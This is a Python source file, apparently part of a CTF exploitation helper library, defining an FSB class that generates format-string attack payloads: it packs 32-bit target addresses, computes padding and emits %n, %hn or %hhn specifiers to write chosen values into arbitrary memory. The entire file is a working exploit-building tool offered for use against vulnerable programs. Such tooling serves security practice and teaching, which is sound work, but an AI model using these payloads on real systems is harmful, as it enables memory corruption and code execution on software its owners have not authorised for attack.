#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from bu6pwn.core import *
import functools

# def debug(function):
#     @functools.wraps(function)
#     def wrapped_function(*args, **kwargs):
#         args_repr=[repr(a) for a in args]
#         kwargs_repr=[f"{k}={v!r}" for k,v in kwargs.items()]
#         print(f"{function.__name__}")
#         print(f"{function.__name__}'s args: {args_repr}'")
#         print(f"{function.__name__}'s kwargs: {kwargs_repr}'")
#         value = function(*args, **kwargs)
#         return value    
#     return wrapped_function 

class FSB(object):
    def __init__(self,header=0,count=None,gap=0,size=2,debug=False):
        self.adrval = {}
        self.padding = False
        self.debug = debug

        gap %= 4
        header_pad = (4 - header%4) % 4
        if header_pad:
            warn('FSB : header size is not a multiple of 4')
            info('FSB : Auto padding size is 0x%d bytes' % header_pad)
            header += header_pad
        if gap or header_pad:
            self.padding = True
            warn('FSB : Use "get()" to generate exploit')
        self.__fsb = b'@'*(gap+header_pad)
        self.header = header
        # CHANGED
        #self.count = (header if count is None else header_pad+count) + gap

        self.count = (header + header_pad if header_pad else header) + gap

        if size == 1:
            self.wfs = 2        # %hhn
            self.fr  = 0x100 
        elif size == 4:
            self.wfs = 0        # %n
            self.fr  = 0x1000000
        else:
            if size != 2:
                warn('FSB : Unit size %d bytes is invalid' % size)
                info('FSB : Set unit size 2 bytes')
                size = 2
            self.wfs = 1
            self.fr = 0x10000
        self.size = size
    
    def get(self):
        return self.__fsb

    def gen(self, fsb):
        try:
            fsb = fsb.encode()
        except AttributeError:
            pass
        n_idx = fsb.find(b'\x00')
        if n_idx >= 0:
            warn('FSB(gen) : null character detected(%d)' % (len(self.__fsb)+n_idx+1))
        try:
            self.__fsb += fsb.encode()
        except AttributeError:
            self.__fsb += fsb
        return b'' if self.padding else fsb
    
    def addr(self, addr):
        self.count += 4
        adr = pack_32(addr)
        return self.gen(adr)
    
    def write(self, index, value):
        x = value - self.count
        fsb  = '%%%dc' % (x if x>0 else self.fr+x) if x else ''
        fsb += '%%%d$%sn' % (index + self.header/4, 'h'*self.wfs)
        self.count = value 
        return self.gen(fsb)

    def set_adrval(self, adr, value):
        self.adrval.update({adr:value})

    def auto_write(self, index):
        adr = pld = b''
        d = {}
        l = []

        for a,v in self.adrval.items():
            if self.size == 1:
                div = {a:v&0xff, a+1:(v>>0x8)&0xff, a+2:(v>>0x10)&0xff, a+3:(v>>0x18)&0xff}
            elif self.size == 4:
                div = {a:v}
            else:
                div = {a:v&0xffff, a+2:v>>0x10}
            d.update(div)
        
        start_count = self.count + len(d)*4
        for a,v in d.items():
            if v < start_count:
                d[a]+=1<<self.size*8

        for a,v in sorted(d.items(), key=lambda x:x[1]):
            if self.debug:
                info('0x{:08x} <- {}'.format(a, v))
            adr += self.addr(a)
            l+=[v]
        for value in l:
            pld += self.write(index, value)
            index += 1
        if self.debug:
            print(adr+pld)
        
        return adr+pld
       